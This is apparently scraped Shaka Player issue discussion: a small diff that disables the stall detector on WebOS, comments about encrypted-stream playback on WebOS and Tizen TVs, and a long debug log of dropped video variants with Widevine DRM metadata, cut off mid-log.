Bonnier Broadcasting *@bonnierbroadcasting.com\n Bryan Huh bhh1988@gmail.com\n Esteban Dosztal edosztal@gmail.com\ndiff --git a/CONTRIBUTORS b/CONTRIBUTORS\nindex 1a84c719..e9c17884 100644\n--- a/CONTRIBUTORS\n+++ b/CONTRIBUTORS\n@@ -23,6 +23,7 @@\n # Please keep the list sorted.\nAaron Vaage vaage@google.com\n+Alvaro Velad Galvan alvaro.velad@mirada.tv\n Andy Hochhaus ahochhaus@samegoal.com\n Benjamin Wallberg benjamin.wallberg@bonnierbroadcasting.com\n Bryan Huh bhh1988@gmail.com\ndiff --git a/lib/media/stall_detector.js b/lib/media/stall_detector.js\nindex d701ff56..834acf37 100644\n--- a/lib/media/stall_detector.js\n+++ b/lib/media/stall_detector.js\n@@ -18,6 +18,7 @@\n goog.provide('shaka.media.StallDetector');\n goog.provide('shaka.media.StallDetector.Implementation');\n goog.provide('shaka.media.StallDetector.MediaElementImplementation');\n+goog.require('shaka.util.Platform');\n/**\n  * Some platforms/browsers can get stuck in the middle of a buffered range (e.g.\n@@ -141,6 +142,9 @@ shaka.media.StallDetector.MediaElementImplementation = class {\n/* @override /\n   shouldBeMakingProgress() {\n+    // If we are in WebOS platform disable StallDetector\n+    if (shaka.util.Platform.isWebOS()) { return false; }\n+\n     // If we are not trying to play, the lack of change could be misidentified\n     // as a stall.\n     if (this.mediaElement_.paused) { return false; }\ndiff --git a/lib/util/platform.js b/lib/util/platform.js\nindex d2de07bb..821b7200 100644\n--- a/lib/util/platform.js\n+++ b/lib/util/platform.js\n@@ -60,6 +60,15 @@ shaka.util.Platform = class {\n     return shaka.util.Platform.userAgentContains_('Tizen 3');\n   }\n\n/**\n\n\nCheck if the current platform is a WebOS.\n\n\n*\n\n\n@return {boolean}\n\n\n*/\nstatic isWebOS() {\nreturn shaka.util.Platform.userAgentContains_('Web0S');\n}\n+\n   /**\nCheck if the current platform is a Google Chromecast.\n*\n```\n\n\n\nNote: I checked that with 3000 is not working always, with some combination on encoder+packager is not working, but the solution disabling the stall Detector is always working.. > @skipness, please wait until we close this issue with @avelad's PR. If, after the PR is merged, you still have the issue you described, please file a separate issue on github, and we will investigate. Thanks!\nI'll send the PR this monday. Thanks!. @joeyparrish / @TheModMaker , Could the support be added to the README.md although it is not integrated automatically yet?. I\u2019m using selectVariantTrack. @beaufortfrancois, I just checked, and they disable the functionality. Do you know if his plan include enable it in the future?. Note: only occurs with encrypted streams. WebOS 3.5 - Firmware 05.80.10 (latest, with previous firmware the issue is not reproduced) Model: 43UJ670V-ZD\nTizen 3 - Firmware 1260 (latest) Model: UE40MU6105\nIn WebOS is reproduced always after load the first encrypted video.\nIn Tizen, I can only reproduce it 5% of the time approx.\nSequence --> Load, reproduce some seconds, load another video.. @vaage Yes, I can run it in the uncompiled version. Tomorrow I will share the result.. Unload latency:0.096\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nFound variant with audio and video content, so filtering out\naudio-only content in all periods.\nCreated MediaKeys object for key systemcom.widevine.alpha\ncodecsavc1-mp4aavg bandwidth4362722.666666667\ncodecsvp9-mp4aavg bandwidth2095317.111111111\nDropping Variant (better codec\navailable){\"id\":31,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":11,\"originalId\":\"10\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1236},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.42c01e\",\"frameRate\":24,\"bandwidth\":103942,\"width\":256,\"height\":110,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":239454,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":32,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":12,\"originalId\":\"12\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1238},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.4d401f\",\"frameRate\":24,\"bandwidth\":421113,\"width\":426,\"height\":182,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":556625,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":33,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":13,\"originalId\":\"19\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1236},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.4d401f\",\"frameRate\":24,\"bandwidth\":1046813,\"width\":854,\"height\":364,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":1182325,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":34,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":14,\"originalId\":\"22\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1236},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.4d401f\",\"frameRate\":24,\"bandwidth\":776186,\"width\":640,\"height\":272,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":911698,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\